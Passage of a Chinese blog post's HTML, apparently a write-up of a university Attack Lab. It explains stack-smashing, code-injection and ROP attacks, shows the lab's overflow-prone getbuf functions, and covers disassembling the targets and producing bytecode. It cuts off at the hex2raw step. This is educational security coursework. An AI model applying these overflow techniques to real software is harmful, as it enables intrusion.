<!doctype html><html lang="zh-CN"><head><meta charset="utf-8" /><meta name="viewport" content="width=device-width,initial-scale=1" /><meta name="generator" content="VuePress 2.0.0-rc.26" /><meta name="theme" content="VuePress Theme Plume 1.0.0-rc.187" /><script id="check-mac-os">document.documentElement.classList.toggle('mac', /Mac|iPhone|iPod|iPad/i.test(navigator.platform))</script><script id="check-dark-mode">;(function () {const um= localStorage.getItem('vuepress-theme-appearance') || 'auto';const sm = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;const isDark = um === 'dark' || (um !== 'light' && sm);document.documentElement.dataset.theme = isDark ? 'dark' : 'light';})();</script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"ICS - Attack Lab | 缓冲区溢出，你看你干的好事！","image":["https://staaaaaaaaar.github.io/blog/ics-attacklab/stack-smashing-attack.png","https://staaaaaaaaar.github.io/blog/ics-attacklab/code-injection-attack.png","https://staaaaaaaaar.github.io/blog/ics-attacklab/rop-attack.png"],"dateModified":"2026-01-29T08:20:13.000Z","author":[]}</script><meta property="og:url" content="https://staaaaaaaaar.github.io/article/n3r0iall/"><meta property="og:site_name" content="Sam's Blog"><meta property="og:title" content="ICS - Attack Lab | 缓冲区溢出，你看你干的好事！"><meta property="og:description" content="在 Attack Lab 中，我们要针对三个存在不同安全漏洞的程序，设计并实现总计六种攻击方案。三个程序有着不同的安全性，可能会有栈随机化保护和栈破坏检测，我们要实现的攻击类型有栈粉碎攻击，代码注入攻击和 ROP 攻击。 预备知识 汇编语言和 GDB 工具 在 Attack Lab 中，我们需要阅读和理解反汇编代码，有时需要使用 GDB 工具进行调试和..."><meta property="og:type" content="article"><meta property="og:image" content="https://staaaaaaaaar.github.io/blog/ics-attacklab/stack-smashing-attack.png"><meta property="og:locale" content="zh-CN"><meta property="og:locale:alternate" content="en-US"><meta property="og:updated_time" content="2026-01-29T08:20:13.000Z"><meta property="article:tag" content="ics"><meta property="article:tag" content="pku"><meta property="article:modified_time" content="2026-01-29T08:20:13.000Z"><link rel="alternate" hreflang="en-us" href="https://staaaaaaaaar.github.io/en/article/n3r0iall/"><link rel="icon" type="image/svg" href="/star.svg"><title>ICS - Attack Lab | 缓冲区溢出，你看你干的好事！ | Sam's Blog</title><meta name="description" content="在 Attack Lab 中，我们要针对三个存在不同安全漏洞的程序，设计并实现总计六种攻击方案。三个程序有着不同的安全性，可能会有栈随机化保护和栈破坏检测，我们要实现的攻击类型有栈粉碎攻击，代码注入攻击和 ROP 攻击。 预备知识 汇编语言和 GDB 工具 在 Attack Lab 中，我们需要阅读和理解反汇编代码，有时需要使用 GDB 工具进行调试和..."><link rel="preload" href="/assets/style-DPuO_-8u.css" as="style"><link rel="stylesheet" href="/assets/style-DPuO_-8u.css"><link rel="modulepreload" href="/assets/app-Db1faIqK.js"><link rel="modulepreload" href="/assets/index.html-piptlnum.js"><link rel="modulepreload" href="/assets/rop-attack-BnYERXrR.js"></head><body><div id="app"><!--[--><!--[--><div class="theme-plume vp-layout" vp-container data-v-91d48f1e><!--[--><!--[--><!--]--><!--[--><span tabindex="-1" data-v-96bb8152></span><a href="#VPContent" class="vp-skip-link visually-hidden" data-v-96bb8152> Skip to content </a><!--]--><!----><header class="vp-nav" data-v-91d48f1e data-v-09fff909><div class="vp-navbar" vp-navbar data-v-09fff909 data-v-bd13effa><div class="wrapper" data-v-bd13effa><div class="container" data-v-bd13effa><div class="title" data-v-bd13effa><div class="vp-navbar-title" data-v-bd13effa data-v-7e08aea3><a class="vp-link link no-icon title" href="/" data-v-7e08aea3><!--[--><!--[--><!--]--><!--[--><!--[--><!--[--><img class="vp-image dark logo" style="" src="/star.svg" alt data-v-2b7ce57b><!--]--><!--[--><img class="vp-image light logo" style="" src="/star.svg" alt data-v-2b7ce57b><!--]--><!--]--><!--]--><span data-v-7e08aea3>Sam&#39;s Blog</span><!--[--><!--]--><!--]--></a></div></div><div class="content" data-v-bd13effa><div class="content-body" data-v-bd13effa><!--[--><!--]--><div class="vp-navbar-search search" data-v-bd13effa><div class="search-wrapper" data-v-de50fffc><!----><div id="local-search" data-v-de50fffc><button type="button" class="mini-search mini-search-button" aria-label="搜索文档" data-v-de50fffc><span class="mini-search-button-container"><span class="mini-search-search-icon vpi-mini-search" aria-label="search icon"></span><span class="mini-search-button-placeholder">搜索文档</span></span><span class="mini-search-button-keys"><kbd class="mini-search-button-key"></kbd><kbd class="mini-search-button-key">K</kbd></span></button></div></div></div><!--[--><!--]--><nav aria-labelledby="main-nav-aria-label" class="vp-navbar-menu menu" data-v-bd13effa data-v-bed0a661><span id="main-nav-aria-label" class="visually-hidden" data-v-bed0a661>Main Navigation</span><!--[--><!--[--><a class="vp-link link navbar-menu-link" href="/" tabindex="0" data-v-bed0a661 data-v-abd4fe28><!--[--><!----><span data-v-abd4fe28>首页</span><!----><!--]--></a><!--]--><!--[--><a class="vp-link link navbar-menu-link" href="/blog/" tabindex="0" data-v-bed0a661 data-v-abd4fe28><!--[--><!----><span data-v-abd4fe28>博客</span><!----><!--]--></a><!--]--><!--[--><div class="vp-flyout vp-navbar-menu-group" data-v-bed0a661 data-v-c1cd76bb><button type="button" class="button" aria-haspopup="true" aria-expanded="false" data-v-c1cd76bb><span class="text" data-v-c1cd76bb><!----><!----><span data-v-c1cd76bb>笔记</span><!----><span class="vpi-chevron-down text-icon" data-v-c1cd76bb></span></span></button><div class="menu" data-v-c1cd76bb><div class="vp-menu" data-v-c1cd76bb data-v-a766b583><div class="items" data-v-a766b583><!--[--><!--[--><div class="vp-menu-link" data-v-a766b583 data-v-bcd5d0fa><a class="vp-link link" href="/FoG/intro/" data-v-bcd5d0fa><!--[--><!----> 地球介质力学基础 <!----><!--]--></a></div><!--]--><!--[--><div class="vp-menu-link" data-v-a766b583 data-v-bcd5d0fa><a class="vp-link link" href="/GSP/gzium104/" data-v-bcd5d0fa><!--[--><!----> 地球物理信号处理 <!----><!--]--></a></div><!--]--><!--]--></div><!--[--><!--]--></div></div></div><!--]--><!--]--></nav><!--[--><!--]--><div class="vp-flyout vp-navbar-translations translations" data-v-bd13effa data-v-71645a86 data-v-c1cd76bb><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="选择语言" data-v-c1cd76bb><span class="text" data-v-c1cd76bb><!----><span class="vpi-languages option-icon" data-v-c1cd76bb></span><!----><!----><span class="vpi-chevron-down text-icon" data-v-c1cd76bb></span></span></button><div class="menu" data-v-c1cd76bb><div class="vp-menu" data-v-c1cd76bb data-v-a766b583><!----><!--[--><!--[--><div class="items" data-v-71645a86><p class="title" data-v-71645a86>简体中文</p><!--[--><div class="vp-menu-link" data-v-71645a86 data-v-bcd5d0fa><a class="vp-link link" href="/en/article/n3r0iall/" data-v-bcd5d0fa><!--[--><!----> English <!----><!--]--></a></div><!--]--></div><!--]--><!--]--></div></div></div><div class="vp-navbar-appearance appearance" data-v-bd13effa data-v-abe53c2d><button class="vp-switch vp-switch-appearance" type="button" role="switch" title aria-checked="false" data-v-abe53c2d data-v-659aa58c data-v-45c72a2c><span class="check" data-v-45c72a2c><span class="icon" data-v-45c72a2c><!--[--><span class="vpi-sun sun" data-v-659aa58c></span><span class="vpi-moon moon" data-v-659aa58c></span><!--]--></span></span></button></div><div class="vp-social-links vp-navbar-social-links social-links" data-v-bd13effa data-v-fb2c4367 data-v-802d5b24><!--[--><a class="vp-social-link no-icon" href="https://github.com/staaaaaaaaar" aria-label="github" title="github" target="_blank" rel="noopener" data-v-802d5b24 data-v-3dd1304a><!----></a><!--]--></div><div class="vp-flyout vp-navbar-extra extra" data-v-bd13effa data-v-b8b08987 data-v-c1cd76bb><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-c1cd76bb><span class="vpi-more-horizontal icon" data-v-c1cd76bb></span></button><div class="menu" data-v-c1cd76bb><div class="vp-menu" data-v-c1cd76bb data-v-a766b583><!----><!--[--><!--[--><div class="group translations" data-v-b8b08987><p class="trans-title" data-v-b8b08987>简体中文</p><!--[--><div class="vp-menu-link" data-v-b8b08987 data-v-bcd5d0fa><a class="vp-link link" href="/en/article/n3r0iall/" data-v-bcd5d0fa><!--[--><!----> English <!----><!--]--></a></div><!--]--></div><div class="group" data-v-b8b08987><div class="item appearance" data-v-b8b08987><p class="label" data-v-b8b08987>外观</p><div class="appearance-action" data-v-b8b08987><button class="vp-switch vp-switch-appearance" type="button" role="switch" title aria-checked="false" data-v-b8b08987 data-v-659aa58c data-v-45c72a2c><span class="check" data-v-45c72a2c><span class="icon" data-v-45c72a2c><!--[--><span class="vpi-sun sun" data-v-659aa58c></span><span class="vpi-moon moon" data-v-659aa58c></span><!--]--></span></span></button></div></div></div><div class="group" data-v-b8b08987><div class="item social-links" data-v-b8b08987><div class="vp-social-links social-links-list" data-v-b8b08987 data-v-802d5b24><!--[--><a class="vp-social-link no-icon" href="https://github.com/staaaaaaaaar" aria-label="github" title="github" target="_blank" rel="noopener" data-v-802d5b24 data-v-3dd1304a><!----></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="vp-navbar-hamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="nav-screen" data-v-bd13effa data-v-68a00901><span class="container" data-v-68a00901><span class="top" data-v-68a00901></span><span class="middle" data-v-68a00901></span><span class="bottom" data-v-68a00901></span></span></button></div></div></div></div><div class="divider" data-v-bd13effa><div class="divider-line" data-v-bd13effa></div></div></div><!----></header><!----><!----><!--[--><div id="VPContent" vp-content class="vp-content" data-v-91d48f1e data-v-529950f9><div class="vp-doc-container is-posts" data-v-529950f9 data-v-9999e088><!--[--><!--]--><div class="container" data-v-9999e088><!----><div class="content" data-v-9999e088><div class="content-container" data-v-9999e088><!--[--><!--]--><main class="main" data-v-9999e088><nav class="vp-breadcrumb" data-v-9999e088 data-v-1578c953><ol vocab="https://schema.org/" typeof="BreadcrumbList" data-v-1578c953><!--[--><li property="itemListElement" typeof="ListItem" data-v-1578c953><a class="vp-link link no-icon breadcrumb" href="/" property="item" typeof="WebPage" data-v-1578c953><!--[-->首页<!--]--></a><span class="vpi-chevron-right" data-v-1578c953></span><meta property="name" content="首页" data-v-1578c953><meta property="position" content="1" data-v-1578c953></li><li property="itemListElement" typeof="ListItem" data-v-1578c953><a class="vp-link link no-icon breadcrumb" href="/blog/" property="item" typeof="WebPage" data-v-1578c953><!--[-->博客<!--]--></a><span class="vpi-chevron-right" data-v-1578c953></span><meta property="name" content="博客" data-v-1578c953><meta property="position" content="2" data-v-1578c953></li><li property="itemListElement" typeof="ListItem" data-v-1578c953><a class="vp-link link no-icon breadcrumb" href="/article/categories/?id=9f50cc" property="item" typeof="WebPage" data-v-1578c953><!--[-->实验<!--]--></a><span class="vpi-chevron-right" data-v-1578c953></span><meta property="name" content="实验" data-v-1578c953><meta property="position" content="3" data-v-1578c953></li><li property="itemListElement" typeof="ListItem" data-v-1578c953><a class="vp-link link no-icon breadcrumb current" href="/article/n3r0iall/" property="item" typeof="WebPage" data-v-1578c953><!--[-->ICS - Attack Lab | 缓冲区溢出，你看你干的好事！<!--]--></a><!----><meta property="name" content="ICS - Attack Lab | 缓冲区溢出，你看你干的好事！" data-v-1578c953><meta property="position" content="4" data-v-1578c953></li><!--]--></ol></nav><!--[--><!--]--><!--[--><div class="vp-doc-title" data-v-911c4096><!--[--><!--]--><h1 class="page-title" data-v-911c4096><!----> ICS - Attack Lab | 缓冲区溢出，你看你干的好事！ <!----></h1><!--[--><!--]--></div><div class="vp-doc-meta" data-v-911c4096><!--[--><!--]--><p class="reading-time" data-v-911c4096><span class="vpi-books icon" data-v-911c4096></span><span data-v-911c4096>约 4694 字</span><span data-v-911c4096>大约 16 分钟</span></p><p data-v-911c4096><span class="vpi-tag icon" data-v-911c4096></span><!--[--><a class="vp-link link tag vp-tag-2vft" href="/article/tags/?tag=pku" data-v-911c4096><!--[-->pku<!--]--></a><a class="vp-link link tag vp-tag-cdrk" href="/article/tags/?tag=ics" data-v-911c4096><!--[-->ics<!--]--></a><!--]--></p><!--[--><!--]--><p class="create-time" data-v-911c4096><span class="vpi-clock icon" data-v-911c4096></span><span data-v-911c4096>2025-10-18</span></p></div><!--]--><!--[--><!--]--><!--[--><div class="_article_n3r0iall_ external-link-icon-enabled vp-doc plume-content" vp-content data-v-9999e088><!--[--><!--]--><div data-v-9999e088><p>在 Attack Lab 中，我们要针对三个存在不同安全漏洞的程序，设计并实现总计六种攻击方案。三个程序有着不同的安全性，可能会有栈随机化保护和栈破坏检测，我们要实现的攻击类型有栈粉碎攻击，代码注入攻击和 ROP 攻击。</p><h2 id="预备知识" tabindex="-1"><a class="header-anchor" href="#预备知识"><span>预备知识</span></a></h2><h3 id="汇编语言和-gdb-工具" tabindex="-1"><a class="header-anchor" href="#汇编语言和-gdb-工具"><span>汇编语言和 GDB 工具</span></a></h3><p>在 Attack Lab 中，我们需要阅读和理解反汇编代码，有时需要使用 GDB 工具进行调试和分析程序行为。</p><h3 id="栈粉碎攻击" tabindex="-1"><a class="header-anchor" href="#栈粉碎攻击"><span>栈粉碎攻击</span></a></h3><p>栈粉碎攻击是一种常见的缓冲区溢出攻击形式，通过向程序输入超长数据，覆盖栈上的返回地址或其他关键数据，从而破坏程序正常控制流。</p><figure><img src="/blog/ics-attacklab/stack-smashing-attack.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="代码注入攻击" tabindex="-1"><a class="header-anchor" href="#代码注入攻击"><span>代码注入攻击</span></a></h3><p>代码注入攻击指攻击者将恶意代码植入目标程序的内存中，并通过溢出等手段跳转至该代码执行。 <img src="/blog/ics-attacklab/code-injection-attack.png" alt="" loading="lazy"></p><h3 id="rop-攻击" tabindex="-1"><a class="header-anchor" href="#rop-攻击"><span>ROP 攻击</span></a></h3><p>ROP（Return-Oriented Programming）攻击是一种高级代码复用技术，通过组合程序中已有的代码片段（称为 gadgets）来构建恶意功能链。 <img src="/blog/ics-attacklab/rop-attack.png" alt="" loading="lazy"></p><h2 id="前置准备" tabindex="-1"><a class="header-anchor" href="#前置准备"><span>前置准备</span></a></h2><h3 id="了解-target" tabindex="-1"><a class="header-anchor" href="#了解-target"><span>了解 target</span></a></h3><p>在开始攻击之前，我们需要了解目标程序的功能和漏洞。Attack Lab 提供了三个目标程序：<code>ctarget</code>、<code>rtarget</code> 和 <code>starget</code>。通过阅读文档，我们知道三者有着相似的读取输入的逻辑。</p><p><code>ctarget</code> 和 <code>rtarget</code> 通过下面定义的 <code>getbuf</code> 函数从标准输入读取字符串：</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">BUFFER_SIZE</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    Gets</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    return</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>gets()</code> 函数无法判断其目标缓冲区是否足以存储将要读取的字符串。该函数会直接复制字节序列，这可能导致超出目标位置已分配存储空间的边界（即发生缓冲区溢出）。</p><p><code>starget</code> 程序同样会从标准输入读取字符串。不过，它使用的是另一个函数 <code>getbuf_with_canary</code>（带金丝雀值的 <code>getbuf</code> 函数）来实现这一操作:</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-c"><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">unsigned</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> getbuf_withcanary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    int</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> len</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">128</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    char</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;"> logMsg</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">128</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    len </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    Gets</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">    memcpy</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">logMsg </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> len</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> sizeof</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">buf</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">));</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">    return</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="反汇编-target" tabindex="-1"><a class="header-anchor" href="#反汇编-target"><span>反汇编 target</span></a></h3><p>在 Attack Lab 中，我们可以使用 <code>objdump</code> 工具对目标程序进行反汇编，以便查看其汇编代码和了解栈空间情况。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">objdump</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -d</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ctarget</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ctarget.s</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">objdump</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -d</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> rtarget</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> rtarget.s</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">objdump</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -d</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> starget</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> starget.s</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="生成指令序列的字节码" tabindex="-1"><a class="header-anchor" href="#生成指令序列的字节码"><span>生成指令序列的字节码</span></a></h3><p>在 Attack Lab 中，要想实现代码注入，我们需要将汇编指令转换为对应的字节码。具体步骤如下：</p><ol><li>编写汇编代码并保存为 <code>example.s</code> 文件：</li></ol><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">pushq   $0xabcdef </span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;"> # Push value onto stack</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">addq    </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">$17</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">   # Add 17 to %rax</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">movl    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edx</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">  # Copy lower 32 bits to %edx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>使用 <code>gcc</code> 工具将汇编代码编译为目标文件：</li></ol><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">gcc</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -c</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> example.s</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -o</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> example.o</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ol start="3"><li>使用 <code>objdump</code> 工具反汇编：</li></ol><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">objdump</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -d</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> example.o</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> example.d</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ol start="4"><li>查看反汇编结果，获取对应的字节码：</li></ol><div class="language-asm line-numbers-mode" data-highlighter="shiki" data-ext="asm" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-asm"><span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">example.o</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">     file format elf64-x86-</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">64</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">Disassembly of </span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">section .text</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">140000000000000000</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> &lt;</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">.text</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&gt;:</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   0</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">: </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">68</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> ef cd ab </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">00</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    pushq   $0xabcdef</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   5</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">: </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 83</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c0 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">11</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       add</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">     $0x11, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rax</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   9</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">: </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">89</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> c2             </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">     %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">, %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">edx</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="hex2raw-工具" tabindex="-1"><a class="header-anchor" href="#hex2raw-工具"><span>hex2raw 工具</span></a></h3><p>在 Attack Lab 中，由于 <code>target</code> 以字符串的形式读入，我们需要使用 <code>hex2raw</code> 工具将十六进制字符串转换为原始字节序列，以便构造攻击载荷。该工具的使用方法如下：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">./hex2raw</span><span 